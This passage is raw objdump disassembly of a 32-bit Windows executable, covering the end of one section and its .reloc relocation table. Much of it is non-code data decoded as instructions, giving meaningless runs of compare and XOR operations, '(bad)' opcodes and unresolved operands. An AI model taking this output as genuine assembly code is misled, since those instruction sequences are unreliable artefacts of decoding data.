  411dec:	(bad)  
  411ded:	clc    
  411dee:	add    BYTE PTR [ecx],al
  411df0:	(bad)  
  411df1:	clc    
  411df2:	add    BYTE PTR [ecx],al
  411df4:	(bad)  
  411df5:	cld    
  411df6:	add    BYTE PTR [ebx],al
  411df8:	add    BYTE PTR [eax],al
  411dfa:	add    DWORD PTR [eax],eax
  411dfc:	add    al,0x0
  411dfe:	adc    BYTE PTR [eax],dl
  411e00:	adc    BYTE PTR [eax],al
  411e02:	add    DWORD PTR [eax],eax
  411e04:	add    al,0x0
  411e06:	sub    BYTE PTR [ecx],al
  411e08:	add    BYTE PTR [eax],al
  411e0a:	add    DWORD PTR [eax],eax
  411e0c:	adc    BYTE PTR [eax],dl
  411e0e:	add    BYTE PTR [eax],al
  411e10:	add    DWORD PTR [eax],eax
  411e12:	or     BYTE PTR [eax],al
  411e14:	push   0x2000005
  411e19:	add    BYTE PTR [eax],ah
  411e1b:	and    BYTE PTR [eax],dl
  411e1d:	add    BYTE PTR [ecx],al
  411e1f:	add    BYTE PTR [eax+eax*1],al
  411e22:	call   0x3411e29
  411e27:	add    BYTE PTR [eax],ah
  411e29:	and    BYTE PTR [eax],al
  411e2b:	add    BYTE PTR [ecx],al
  411e2d:	add    BYTE PTR [eax],cl
  411e2f:	add    BYTE PTR [eax+0x4000008],ch
  411e35:	add    BYTE PTR [eax],al
  411e37:	add    ch,cl
  411e39:	dec    ch
  411e3b:	(bad)  
  411e3c:	rol    BYTE PTR [eax],1
  411e3e:	add    BYTE PTR [eax],al
  411e40:	add    BYTE PTR [eax],al
  411e42:	add    DWORD PTR [eax],eax
  411e44:	add    BYTE PTR [eax],al
  411e46:	add    BYTE PTR [eax],al
  411e48:	adc    DWORD PTR [eax],eax
  411e4a:	add    BYTE PTR [eax],al
  411e4c:	add    BYTE PTR [eax],al
  411e4e:	add    BYTE PTR [eax],al
  411e50:	add    al,BYTE PTR [eax]
  411e52:	add    BYTE PTR [eax],al
  411e54:	repnz mov edx,0xe7230e40
  411e5a:	push   0x24e3fd1a
  411e5f:	mov    ch,0x84
  411e61:	ins    DWORD PTR es:[edi],dx
  411e62:	loopne 0x411df6
  411e64:	pop    esp
  411e65:	pop    esp
  411e66:	mov    ecx,0x9b17892f
  411e6b:	sti    
  411e6c:	outs   dx,DWORD PTR ds:[esi]
  411e6d:	lods   al,BYTE PTR ds:[esi]
  411e6e:	stc    
  411e6f:	jp     0x411e7b
  411e71:	mov    edx,0x1c80
	...
  411e8a:	add    BYTE PTR [eax],al
  411e8c:	mov    BYTE PTR [eax],al
  411e8e:	add    BYTE PTR [eax],al
  411e90:	push   cs
  411e91:	add    BYTE PTR [eax],al
  411e93:	add    BYTE PTR [eax+0x10000000],bl
  411e99:	add    BYTE PTR [eax],al
  411e9b:	add    BYTE PTR [eax+0xe000000],ch
  411ea1:	add    BYTE PTR [eax],al
  411ea3:	add    BYTE PTR [eax+0x4000000],bh
	...
  411eb1:	add    BYTE PTR [eax],al
  411eb3:	add    al,al
  411eb5:	add    BYTE PTR [eax],al
  411eb7:	add    BYTE PTR [eax+eax*1],cl
  411eba:	add    BYTE PTR [eax],al
  411ebc:	add    BYTE PTR [eax],al
  411ebe:	add    BYTE PTR [eax],al
  411ec0:	dec    ebp
  411ec1:	add    BYTE PTR [ebp+0x0],dl
  411ec4:	dec    ecx
	...
  411ecd:	add    BYTE PTR [eax],al
  411ecf:	add    BYTE PTR [ebx],al
  411ed1:	add    BYTE PTR [eax],al
  411ed3:	add    BYTE PTR [esi],cl
  411ed5:	add    BYTE PTR [eax],al
  411ed7:	add    BYTE PTR [eax],dl
  411ed9:	add    BYTE PTR [eax],al
  411edb:	add    BYTE PTR [eax],bl
  411edd:	add    BYTE PTR [eax],al
  411edf:	add    BYTE PTR [ebp+0x0],cl
  411ee2:	push   ebp
  411ee3:	add    BYTE PTR [ecx+0x0],cl
	...
  411eee:	add    BYTE PTR [eax],al
  411ef0:	adc    BYTE PTR [eax],al
  411ef2:	add    BYTE PTR [eax],al
  411ef4:	add    BYTE PTR [eax],al
  411ef6:	add    BYTE PTR [eax],al
  411ef8:	add    BYTE PTR gs:[esi+0x0],ch
  411efc:	sub    eax,0x53005500
  411f01:	add    BYTE PTR [eax],al
  411f03:	add    BYTE PTR [eax],al
  411f05:	add    BYTE PTR [eax],al
	...

Disassembly of section .reloc:

00412000 <.reloc>:
  412000:	add    BYTE PTR [eax],dl
  412002:	add    BYTE PTR [eax],al
  412004:	sbb    al,0x0
  412006:	add    BYTE PTR [eax],al
  412008:	add    al,0x30
  41200a:	or     BYTE PTR [eax],dh
  41200c:	or     al,0x30
  41200e:	adc    BYTE PTR [eax],dh
  412010:	adc    al,0x30
  412012:	and    BYTE PTR [eax],dh
  412014:	and    al,0x30
  412016:	shl    BYTE PTR [ecx],0xc4
  412019:	xor    esp,ebx
  41201b:	aas    
  41201c:	add    BYTE PTR [eax],ah
  41201e:	add    BYTE PTR [eax],al
  412020:	enter  0x0,0x0
  412024:	and    BYTE PTR [eax],dh
  412026:	and    al,0x30
  412028:	sub    BYTE PTR [eax],dh
  41202a:	sub    al,0x30
  41202c:	xor    BYTE PTR [eax],dh
  41202e:	xor    al,0x30
  412030:	cmp    BYTE PTR [eax],dh
  412032:	cmp    al,0x30
  412034:	inc    eax
  412035:	xor    BYTE PTR [eax+esi*1+0x48],al
  412039:	xor    BYTE PTR [eax+esi*1+0x50],cl
  41203d:	xor    BYTE PTR [eax+esi*1+0x58],dl
  412041:	xor    BYTE PTR [eax+esi*1+0x60],bl
  412045:	xor    BYTE PTR [eax+esi*1+0x68],ah
  412049:	xor    BYTE PTR [eax+esi*1+0x70],ch
  41204d:	xor    BYTE PTR [eax+esi*1-0x58],dh
  412051:	xor    BYTE PTR [eax+esi*1+0x30b430b0],ch
  412058:	mov    eax,0x88338430
  41205d:	xor    edx,DWORD PTR [eax+0x61339833]
  412063:	ss je  0x41209c
  412066:	jp     0x41209e
  412068:	xor    DWORD PTR [esi],0xffffff8c
  41206b:	ss xchg edx,eax
  41206d:	ss xchg edi,eax
  41206f:	ss popf 
  412071:	ss mov cl,0x36
  412074:	shl    DWORD PTR [esi],0xec
  412077:	aaa    
  412078:	push   esp
  412079:	cmp    BYTE PTR [esi+0x39],bl
  41207c:	jge    0x4120b7
  41207e:	xchg   ecx,eax
  41207f:	cmp    DWORD PTR [esi-0x38c642c7],esi
  412085:	cmp    edx,ebx
  412087:	cmp    ecx,esp
  412089:	cmp    DWORD PTR [esi],eax
  41208b:	cmp    dh,BYTE PTR [edx]
  41208d:	cmp    bh,BYTE PTR [ebx]
  41208f:	cmp    al,BYTE PTR [ecx+0x3a]
  412092:	popa   
  412093:	cmp    dh,BYTE PTR [ebp+0x3a]
  412096:	test   BYTE PTR [edx],bh
  412098:	mov    ?,WORD PTR [edx]
  41209a:	pushf  
  41209b:	cmp    ch,BYTE PTR [eax-0x44c549c6]
  4120a1:	cmp    al,bl
  4120a3:	cmp    cl,ah
  4120a5:	cmp    dl,cl
  4120a7:	cmp    bl,al
  4120a9:	cmp    ch,bl
  4120ab:	cmp    dh,dh
  4120ad:	cmp    dl,BYTE PTR [esi]
  4120af:	cmp    ebp,DWORD PTR [ebx+edi*1]
  4120b2:	xor    eax,0x5a3b503b
  4120b7:	cmp    esp,DWORD PTR [ebp+0x3b]
  4120ba:	jnp    0x4120f7
  4120bc:	mov    edi,DWORD PTR [ebx]
  4120be:	sahf   
  4120bf:	cmp    ebp,DWORD PTR [esi-0x7ac425c5]
  4120c5:	cmp    al,0xaf
  4120c7:	cmp    al,0xde
  4120c9:	cmp    al,0x8
  4120cb:	cmp    eax,0x3d983d32
  4120d0:	ret    
  4120d1:	cmp    eax,0x3e463df2
  4120d6:	jne    0x412116
  4120d8:	retf   
  4120d9:	ds cli 
  4120db:	ds and al,0x3f
  4120de:	cmp    BYTE PTR [edi],0xb1
  4120e1:	aas    
  4120e2:	hlt    
  4120e3:	aas    
  4120e4:	add    BYTE PTR [eax],dh
  4120e6:	add    BYTE PTR [eax],al
  4120e8:	xor    BYTE PTR [ecx],al
  4120ea:	add    BYTE PTR [eax],al
  4120ec:	push   ds
  4120ed:	xor    BYTE PTR [ebp+0x30],cl
  4120f0:	xchg   ebp,eax
  4120f1:	xor    cl,dl
  4120f3:	xor    cl,bh
  4120f5:	xor    BYTE PTR [ecx],ah
  4120f7:	xor    DWORD PTR [ecx],edi
  4120f9:	xor    DWORD PTR [ebx+0x31],ebx
  4120fc:	jno    0x41212f
  4120fe:	test   DWORD PTR [ecx],esi
  412100:	sahf   
  412101:	xor    DWORD PTR [ebp-0x2bce35cf],ebp
  412107:	xor    edi,ebp
  412109:	xor    DWORD PTR [ecx],ecx
  41210b:	xor    ch,BYTE PTR [ebx]
  41210d:	xor    al,BYTE PTR [esi+0x32]
  412110:	pop    esi
  412111:	xor    ch,BYTE PTR [ebx+0x32]
  412114:	jne    0x412148
  412116:	mov    BYTE PTR [edx],dh
  412118:	nop
  412119:	xor    dh,BYTE PTR [eax-0x35cd3cce]
  41211f:	xor    dl,al
  412121:	xor    ch,bh
  412123:	xor    al,BYTE PTR ds:0x41332c33
  412129:	xor    ebx,DWORD PTR [ecx-0x26cc57cd]
  41212f:	xor    esi,esi
  412131:	xor    edx,DWORD PTR [ecx]
  412133:	xor    al,0x17
  412135:	xor    al,0x1f
  412137:	xor    al,0x29
  412139:	xor    al,0x32
  41213b:	xor    al,0x3c
  41213d:	xor    al,0x42
  41213f:	xor    al,0x53
  412141:	xor    al,0x61
  412143:	xor    al,0x69
  412145:	xor    al,0x74
  412147:	xor    al,0x80
  412149:	xor    al,0x91
  41214b:	xor    al,0xa5
  41214d:	xor    al,0xb2
  41214f:	xor    al,0xee
  412151:	xor    al,0xf6
  412153:	xor    al,0x0
  412155:	xor    eax,0x350f3506
  41215a:	sbb    dh,BYTE PTR ds:0x35413525
  412160:	dec    eax
  412161:	xor    eax,0x355e354e
  412166:	ins    DWORD PTR es:[edi],dx
  412167:	xor    eax,0x3589357b
  41216c:	xchg   ebp,eax
  41216d:	xor    eax,0x35a3359e
  412172:	mov    dl,0x35
  412174:	mov    bh,0x35
  412176:	mov    ebp,0xcb35c535
  41217b:	xor    eax,0x35d735d1
  412180:	jecxz  0x4121b7
  412182:	jmp    0x2336:0x1935f635
  412189:	ss ss ss cmp al,0x36
  41218e:	inc    ecx
  41218f:	ss dec edx
  412191:	ss push ecx
  412193:	ss ss ins DWORD PTR es:[di],dx
  412197:	ss jbe 0x4121d0
  41219a:	xchg   ecx,eax
  41219b:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41219d:	shl    BYTE PTR ss:[esi],0xcc
  4121a1:	shl    DWORD PTR ss:[esi],1
  4121a4:	(bad)  
  4121a5:	fnsave ss:[esi]
  4121a8:	in     al,dx
  4121a9:	add    dh,BYTE PTR ss:[edi]
  4121ac:	adc    dh,BYTE PTR [edi]
  4121ae:	cmp    dh,BYTE PTR [edi]
  4121b0:	dec    esp
  4121b1:	aaa    
  4121b2:	push   esi
  4121b3:	aaa    
  4121b4:	pop    esp
  4121b5:	aaa    
  4121b6:	popa   
  4121b7:	aaa    
  4121b8:	push   0x37
  4121ba:	jno    0x4121f3
  4121bc:	test   BYTE PTR [edi],dh
  4121be:	mov    dh,BYTE PTR [edi]
  4121c0:	xchg   ebx,eax
  4121c1:	aaa    
  4121c2:	mov    bl,0x37
  4121c4:	(bad)  
  4121c5:	aaa    
  4121c6:	inc    esp
  4121c7:	cmp    BYTE PTR [edx+0x38],cl
  4121ca:	push   esp
  4121cb:	cmp    BYTE PTR [ebx-0xfc742c8],bl
  4121d1:	cmp    dl,bh
  4121d3:	cmp    BYTE PTR [edx],dl
  4121d5:	cmp    DWORD PTR [edx],esi
  4121d7:	cmp    DWORD PTR [esi+0x39],edx
  4121da:	cmp    BYTE PTR [ecx],0xa4
  4121dd:	cmp    edx,edx
  4121df:	cmp    DWORD PTR [esi],edx
  4121e1:	cmp    al,BYTE PTR [edx+edi*1-0x7c]
  4121e5:	cmp    ah,BYTE PTR [edx+edi*1+0x3ae63ac5]
  4121ec:	std    
  4121ed:	cmp    dh,BYTE PTR [ebx+0x613cf63c]
  4121f3:	cmp    eax,0x3da63da0
  4121f8:	sar    DWORD PTR ds:0x3e2f3ddb,cl
  4121fe:	pop    esi
  4121ff:	ds jle 0x412240
  412202:	xchg   BYTE PTR [esi],bh
  412204:	lahf   
  412205:	ds test al,0x3e
  412208:	mov    al,0x3e
  41220a:	idiv   DWORD PTR [esi]
  41220c:	pop    esp
  41220d:	aas    
  41220e:	ins    BYTE PTR es:[edi],dx
  41220f:	aas    
  412210:	fdivr  DWORD PTR [edi]
  412212:	add    BYTE PTR [eax],al
  412214:	add    BYTE PTR [eax+0x0],al
  412217:	add    BYTE PTR [eax],bl
  412219:	add    DWORD PTR [eax],eax
  41221b:	add    BYTE PTR [ecx],al
  41221d:	xor    BYTE PTR [eax],dh
  41221f:	xor    BYTE PTR [esi],dh
  412221:	xor    BYTE PTR [ecx+0x30],cl
  412224:	dec    edi
  412225:	xor    BYTE PTR [ebx+0x30],dh
  412228:	jns    0x41225a
  41222a:	xor    DWORD PTR [eax],0xffffff99
  41222d:	xor    BYTE PTR [eax-0x46cf4dd0],ah
  412233:	xor    ah,dl
  412235:	xor    BYTE PTR ds:0x49311f31,cl
  41223b:	xor    DWORD PTR [ecx+0x31],esi
  41223e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41223f:	xor    ecx,edx
  412241:	xor    ebp,ebp
  412243:	xor    ebx,esi
  412245:	xor    DWORD PTR [ebx],esp
  412247:	xor    bh,BYTE PTR [ecx-0x76cd1ace]
  41224d:	xor    ecx,eax
  41224f:	xor    ecx,edi
  412251:	xor    ebx,eax
  412253:	xor    ebx,edi
  412255:	xor    ebp,eax
  412257:	xor    ebp,edi
  412259:	xor    edx,DWORD PTR [esp+esi*1]
  41225c:	inc    edx
  41225d:	xor    al,0x77
  41225f:	xor    al,0x81
  412261:	xor    al,0xa3
  412263:	xor    al,0xa9
  412265:	xor    al,0xd2
  412267:	xor    al,0xd9
  412269:	xor    al,0xf6
  41226b:	xor    al,0xa
  41226d:	xor    eax,0x354c3510
  412272:	push   esi
  412273:	xor    eax,0x35933572
  412278:	sahf   
  412279:	xor    eax,0x35b035a8
  41227e:	repnz xor eax,0x360935fc
  412284:	pop    edi
  412285:	xor    DWORD PTR ss:[esi],0xffffff9d
  412289:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41228b:	ss mov ecx,0xca36c436
  412291:	shl    DWORD PTR ss:[esi],cl
  412294:	fdiv   DWORD PTR [esi]
  412296:	loope  0x4122ce
  412298:	in     eax,dx
  412299:	ss cmc 
  41229b:	ss or  al,0x37
  41229e:	adc    eax,0x2b372537
  4122a3:	aaa    
  4122a4:	pop    esi
  4122a5:	aaa    
  4122a6:	gs aaa 
  4122a8:	outs   dx,BYTE PTR ds:[esi]
  4122a9:	aaa    
  4122aa:	jbe    0x4122e3
  4122ac:	test   BYTE PTR [edi],dh
  4122ae:	mov    dh,BYTE PTR [edi]
  4122b0:	(bad)  
  4122b1:	aaa    
  4122b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122b3:	aaa    
  4122b4:	stos   BYTE PTR es:[edi],al
  4122b5:	aaa    
  4122b6:	mov    ecx,0xea37c037
  4122bb:	aaa    
  4122bc:	div    DWORD PTR [edi]
  4122be:	push   DWORD PTR [edi]
  4122c0:	xor    edi,DWORD PTR [eax]
  4122c2:	mov    WORD PTR [eax],?
  4122c4:	mov    eax,ds:0xf438dd38
  4122c9:	cmp    BYTE PTR [edi+0x39],ah
  4122cc:	mov    ecx,0xf39ce39
  4122d1:	cmp    bl,ah
  4122d3:	cmp    ah,dl
  4122d5:	cmp    ch,BYTE PTR [ecx+0x3b]
  4122d8:	xchg   esi,eax
  4122d9:	cmp    ebp,DWORD PTR [ebx-0x33c44dc5]
  4122df:	cmp    eax,DWORD PTR [esi]
  4122e1:	cmp    al,0x25
  4122e3:	cmp    al,0x67
  4122e5:	cmp    al,0x77
  4122e7:	cmp    al,0x86
  4122e9:	cmp    al,0xcf
  4122eb:	cmp    al,0xe7
  4122ed:	cmp    al,0xfb
  4122ef:	cmp    al,0x2
  4122f1:	cmp    eax,0x3d2a3d22
  4122f6:	cmp    DWORD PTR ds:0x3d853d73,edi
  4122fc:	lea    edi,ds:0x3dbf3d96
  412302:	enter  0xe93d,0x3d
  412306:	adc    edi,DWORD PTR [esi]
  412308:	xchg   BYTE PTR [esi],bh
  41230a:	call   0xcf3e:0xb63eac3e
  412311:	fnstcw WORD PTR ds:[esi]
  412314:	hlt    
  412315:	add    BYTE PTR ds:[edi],bh
  412318:	sbb    DWORD PTR [edi],edi
  41231a:	sub    BYTE PTR [edi],bh
  41231c:	cs aas 
  41231e:	data16 aas 
  412320:	xchg   BYTE PTR [edi],bh
  412322:	lods   eax,DWORD PTR ds:[esi]
  412323:	aas    
  412324:	out    dx,al
  412325:	aas    
  412326:	hlt    
  412327:	aas    
  412328:	cli    
  412329:	aas    
  41232a:	add    BYTE PTR [eax],al
  41232c:	add    BYTE PTR [eax+0x0],dl
  41232f:	add    BYTE PTR [eax],ah
  412331:	add    DWORD PTR [eax],eax
  412333:	add    BYTE PTR [eax],al
  412335:	xor    BYTE PTR [esi],al
  412337:	xor    BYTE PTR [ebx],bl
  412339:	xor    BYTE PTR [esi],ah
  41233b:	xor    BYTE PTR [edi],dh
  41233d:	xor    BYTE PTR ds:0x87304330,bh
  412343:	xor    BYTE PTR [eax-0x58cf61d0],bl
  412349:	xor    BYTE PTR [ecx-0x31cf44d0],dh
  41234f:	xor    ch,bl
  412351:	xor    ah,dh
  412353:	xor    BYTE PTR [ecx+esi*1],al
  412356:	sbb    esi,DWORD PTR [ecx]
  412358:	daa    
  412359:	xor    DWORD PTR [esi],edi
  41235b:	xor    DWORD PTR [ecx+0x31],ecx
  41235e:	push   esp
  41235f:	xor    DWORD PTR [edx+0x31],esp
  412362:	jge    0x412395
  412364:	xchg   edx,eax
  412365:	xor    DWORD PTR [ebp-0x56ce5ccf],ebx
  41236b:	xor    DWORD PTR [eax+0x331bf31],edi
  412371:	xor    cl,BYTE PTR [edi]
  412373:	xor    ch,BYTE PTR [ebx]
  412375:	xor    dh,BYTE PTR [edx+esi*1]
  412378:	xor    BYTE PTR [edx],0xa4
  41237b:	xor    bh,BYTE PTR [ebp-0x29cd32ce]
  412381:	xor    ah,al
  412383:	xor    al,BYTE PTR ds:0x11330c33
  412389:	xor    edx,DWORD PTR [esi]
  41238b:	xor    ebx,DWORD PTR [ebx]
  41238d:	xor    esp,DWORD PTR [eax]
  41238f:	xor    ebp,DWORD PTR [eax]
  412391:	xor    esi,DWORD PTR [ecx]
  412393:	xor    edi,DWORD PTR [ebp+0x33]
  412396:	mov    ds:0xd533c333,eax
  41239b:	xor    ebx,ebx
  41239d:	xor    ebp,edx
  41239f:	xor    edi,ebp
  4123a1:	xor    eax,DWORD PTR [ebx+0x34]
  4123a4:	dec    edi
  4123a5:	xor    al,0x63
  4123a7:	xor    al,0x6f
  4123a9:	xor    al,0x84
  4123ab:	xor    al,0x8a
  4123ad:	xor    al,0xbf
  4123af:	xor    al,0xd4
  4123b1:	xor    al,0xf3
  4123b3:	xor    al,0xfa
  4123b5:	xor    al,0x1c
  4123b7:	xor    eax,0x3537352f
  4123bc:	inc    eax
  4123bd:	xor    eax,0x35573549
  4123c2:	xor    ax,0x3573
  4123c6:	xchg   edi,eax
  4123c7:	xor    eax,0x35c035a9
  4123cc:	(bad)  
  4123cd:	xor    eax,0x363a35ec
  4123d2:	dec    edx
  4123d3:	ss dec edi
  4123d5:	ss push edi
  4123d7:	bound  esi,QWORD PTR ss:[esi]
  4123da:	imul   esi,DWORD PTR [esi],0x369f367b
  4123e0:	lods   eax,DWORD PTR ds:[esi]
  4123e1:	shl    DWORD PTR ss:[esi],cl
  4123e4:	sti    
  4123e5:	ss sbb eax,0x6c372337
  4123eb:	aaa    
  4123ec:	pushf  
  4123ed:	aaa    
  4123ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123ef:	aaa    
  4123f0:	ret    
  4123f1:	aaa    
  4123f2:	fdiv   QWORD PTR [edi]
  4123f4:	cld    
  4123f5:	aaa    
  4123f6:	adc    al,0x38
  4123f8:	sbb    bh,BYTE PTR [eax]
  4123fa:	sub    DWORD PTR [eax],edi
  4123fc:	das    
  4123fd:	cmp    BYTE PTR ds:0x883ac038,dh
  412403:	cmp    ebp,DWORD PTR [ebx+0x143bca3b]
  412409:	cmp    al,0x21
  41240b:	cmp    al,0x2d
  41240d:	cmp    al,0x36
  41240f:	cmp    al,0x3f
  412411:	cmp    al,0x68
  412413:	cmp    al,0xae
  412415:	cmp    al,0xc4
  412417:	cmp    al,0xf8
  412419:	cmp    al,0x6
  41241b:	cmp    eax,0x3d223d17
  412420:	xor    eax,0x453d3b3d
  412425:	cmp    eax,0x3d613d4c
  41242a:	(bad)  
  41242b:	cmp    eax,0x3de23dcf
  412430:	jmp    0x41246f
  412432:	repnz cmp eax,0x3e083e02
  412438:	adc    bh,BYTE PTR [esi]
  41243a:	xor    al,0x3e
  41243c:	cmp    BYTE PTR [esi],0x86
  41243f:	mov    edi,DWORD PTR ds:[esi]
  412442:	xchg   edi,eax
  412443:	mov    ds:0x8f3ef43e,al
  412449:	aas    
  41244a:	aam    0x3f
  41244c:	add    BYTE PTR [eax+0x0],ah
  41244f:	add    al,dl
  412451:	add    BYTE PTR [eax],al
  412453:	add    BYTE PTR [eax],al
  412455:	xor    BYTE PTR [ecx],ch
  412457:	xor    BYTE PTR ds:0xc630c130,dh
  41245d:	xor    bh,dl
  41245f:	xor    ah,bl
  412461:	xor    dl,ch
  412463:	xor    bh,dh
  412465:	xor    BYTE PTR ds:0x2d312231,al
  41246b:	xor    DWORD PTR [eax+0x31],ebx
  41246e:	imul   esi,DWORD PTR [ecx],0x76
  412471:	xor    DWORD PTR [ecx-0x58ce6bcf],ecx
  412477:	xor    DWORD PTR [edx-0x2fce3acf],esi
  41247d:	xor    ebx,esp
  41247f:	xor    esi,ebp
  412481:	xor    DWORD PTR [ecx],eax
  412483:	xor    cl,BYTE PTR [edx+esi*1]
  412486:	pop    ds
  412487:	xor    ch,BYTE PTR [edx]
  412489:	xor    al,BYTE PTR [edx+esi*1+0x32b33296]
  412490:	lds    esi,FWORD PTR [edx]
  412492:	xchg   DWORD PTR [ebx],esi
  412494:	iret   
  412495:	xor    al,0x77
  412497:	xor    eax,0x35ac357d
  41249c:	das    
  41249d:	ss jnp 0x4124d6
  4124a0:	pop    eax
  4124a1:	aaa    
  4124a2:	bound  esi,QWORD PTR [edi]
  4124a4:	push   0x37
  4124a6:	js     0x4124df
  4124a8:	les    esi,FWORD PTR [edi]
  4124aa:	add    bh,BYTE PTR [eax]
  4124ac:	mov    dh,0x38
  4124ae:	fnstsw WORD PTR [eax]
  4124b0:	or     BYTE PTR [ecx],bh
  4124b2:	and    al,0x39
  4124b4:	cmp    DWORD PTR ss:[esi],edi
  4124b7:	cmp    DWORD PTR [eax+0x39],ecx
  4124ba:	js     0x4124f5
  4124bc:	xchg   BYTE PTR [ecx],bh
  4124be:	mov    eax,ds:0x3a3a1d39
  4124c3:	cmp    cl,BYTE PTR [edx+edi*1+0x56]
  4124c7:	cmp    ah,BYTE PTR [ecx+0x3a]
  4124ca:	data16 cmp bh,BYTE PTR [eax+0x3a]
  4124ce:	cmp    BYTE PTR [edx],0x88
  4124d1:	cmp    dl,BYTE PTR [ebx-0x54c564c6]
  4124d7:	cmp    bh,BYTE PTR [ebp-0x4ec455c6]
  4124dd:	cmp    eax,eax
  4124df:	cmp    ebx,eax
  4124e1:	cmp    esp,esp
  4124e3:	cmp    ebp,esi
  4124e5:	cmp    edi,ebx
  4124e7:	cmp    ecx,DWORD PTR [esi]
  4124e9:	cmp    al,0x15
  4124eb:	cmp    al,0x4d
  4124ed:	cmp    al,0x62
  4124ef:	cmp    al,0x88
  4124f1:	cmp    al,0xd8
  4124f3:	cmp    al,0xf4
  4124f5:	cmp    al,0xfd
  4124f7:	cmp    al,0xc
  4124f9:	cmp    eax,0x3d463d17
  4124fe:	jg     0x41253d
  412500:	or     DWORD PTR [esi],edi
  412502:	fstp   TBYTE PTR [esi]
  412504:	in     eax,0x3e
  412506:	cld    
  412507:	ds pop es
  412509:	aas    
  41250a:	and    edi,DWORD PTR [edi]
  41250c:	cmp    edi,DWORD PTR [edi]
  41250e:	inc    edx
  41250f:	aas    
  412510:	push   edx
  412511:	aas    
  412512:	outs   dx,BYTE PTR ds:[esi]
  412513:	aas    
  412514:	jge    0x412555
  412516:	lods   al,BYTE PTR ds:[esi]
  412517:	aas    
  412518:	mov    bl,0x3f
  41251a:	repz aas 
  41251c:	add    BYTE PTR [eax+0x0],dh
  41251f:	add    BYTE PTR [eax+0x9000001],bl
  412525:	xor    BYTE PTR [edx],dl
  412527:	xor    BYTE PTR [esi],ah
  412529:	xor    BYTE PTR [esi+0x30],al
  41252c:	jp     0x41255e
  41252e:	xchg   edx,eax
  41252f:	xor    BYTE PTR [edi-0x3acf53d0],dl
  412535:	xor    bl,cl
  412537:	xor    dl,dl
  412539:	xor    cl,ah
  41253b:	xor    cl,ch
  41253d:	xor    BYTE PTR [ecx+esi*1],al
  412540:	pop    ss
  412541:	xor    DWORD PTR [edx],esp
  412543:	xor    DWORD PTR [esi+0x31],ebx
  412546:	jns    0x412579
  412548:	xchg   esp,eax
  412549:	xor    ebx,eax
  41254b:	xor    eax,ebx
  41254d:	xor    esi,esp
  41254f:	xor    ebx,edi
  412551:	xor    DWORD PTR [ebx],edx
  412553:	xor    ch,BYTE PTR [edi]
  412555:	xor    cl,BYTE PTR [edi+0x32]
  412558:	pop    edi
  412559:	xor    dh,BYTE PTR [edi+0x32]
  41255c:	(bad)  
  41255d:	xor    bh,BYTE PTR [ebp+0x832ea32]
  412563:	xor    ebx,DWORD PTR [edx]
  412565:	xor    edx,DWORD PTR [eax+0x33]
  412568:	pop    esi
  412569:	xor    esi,DWORD PTR [ecx+0x33]
  41256c:	cdq    
  41256d:	xor    edi,DWORD PTR [edi-0x33cc3acd]
  412573:	xor    edi,ebx
  412575:	xor    ebx,DWORD PTR [ebx]
  412577:	xor    al,0x3b
  412579:	xor    al,0x5b
  41257b:	xor    al,0x83
  41257d:	xor    al,0x92
  41257f:	xor    al,0xa4
  412581:	xor    al,0xad
  412583:	xor    al,0xd2
  412585:	xor    al,0xf2
  412587:	xor    al,0x12
  412589:	xor    eax,0x35523532
  41258e:	pop    edi
  41258f:	xor    eax,0x35723567
  412594:	js     0x4125cb
  412596:	xchg   ebx,eax
  412597:	xor    eax,0x35ae359a
  41259c:	ret    
  41259d:	xor    eax,0x35d535cd
  4125a2:	jmp    0x5b771cdc
  4125a7:	imul   esi,DWORD PTR ss:[esi],0xffffff95
  4125ab:	ss popf 
  4125ad:	ss repnz ss pop ss
  4125b1:	aaa    
  4125b2:	push   ds
  4125b3:	aaa    
  4125b4:	and    al,0x37
  4125b6:	cs aaa 
  4125b8:	xor    eax,0x66376137
  4125bd:	aaa    
  4125be:	ins    BYTE PTR es:[edi],dx
  4125bf:	aaa    
  4125c0:	jno    0x4125f9
  4125c2:	jnp    0x4125fb
  4125c4:	xor    BYTE PTR [edi],0xa5
  4125c7:	aaa    
  4125c8:	lods   al,BYTE PTR ds:[esi]
  4125c9:	aaa    
  4125ca:	mov    ah,0x37
  4125cc:	ret    0xd137
  4125cf:	aaa    
  4125d0:	fnsave [edi]
  4125d2:	jecxz  0x41260b
  4125d4:	jmp    0x42793210
  4125d9:	cmp    BYTE PTR [ebp+0x38],cl
  4125dc:	pop    ebp
  4125dd:	cmp    BYTE PTR [eax+edi*1+0x6f],ah
  4125e1:	cmp    BYTE PTR [ebx-0x3ec650c8],dh
  4125e7:	cmp    edi,eax
  4125e9:	cmp    esp,edx
  4125eb:	cmp    ebp,ebp
  4125ed:	cmp    edx,edi
  4125ef:	cmp    DWORD PTR [edi],eax
  4125f1:	cmp    ah,BYTE PTR [ecx]
  4125f3:	cmp    ch,BYTE PTR [esi+0x3a]
  4125f6:	jne    0x412632
  4125f8:	jnp    0x412634
  4125fa:	cmp    DWORD PTR [edx],0x3a8d3a87
  412600:	mov    al,0x3a
  412602:	mov    ecx,0xc43abf3a
  412607:	cmp    cl,dl
  412609:	cmp    bl,dh
  41260b:	cmp    dh,al
  41260d:	cmp    dh,bh
  41260f:	cmp    al,BYTE PTR [ecx]
  412611:	cmp    eax,DWORD PTR [esi]
  412613:	cmp    edx,DWORD PTR [ecx]
  412615:	cmp    esp,DWORD PTR ds:0x363b313b
  41261b:	cmp    eax,DWORD PTR [eax+0x3b]
  41261e:	pop    esi
  41261f:	cmp    ebp,DWORD PTR [ecx+0x3b]
  412622:	jno    0x41265f
  412624:	test   DWORD PTR [ebx],edi
  412626:	sahf   
  412627:	cmp    ebp,DWORD PTR [ecx-0x3cc44bc5]
  41262d:	cmp    edx,esp
  41262f:	cmp    esi,eax
  412631:	cmp    edi,esi
  412633:	cmp    edx,DWORD PTR [edx]
  412635:	cmp    al,0x26
  412637:	cmp    al,0x33
  412639:	cmp    al,0x45
  41263b:	cmp    al,0x61
  41263d:	cmp    al,0x77
  41263f:	cmp    al,0x7c
  412641:	cmp    al,0x82
  412643:	cmp    al,0x89
  412645:	cmp    al,0xa3
  412647:	cmp    al,0xae
  412649:	cmp    al,0xb5
  41264b:	cmp    al,0xbd
  41264d:	cmp    al,0xc2
  41264f:	cmp    al,0xd1
  412651:	cmp    al,0xe5
  412653:	cmp    al,0xec
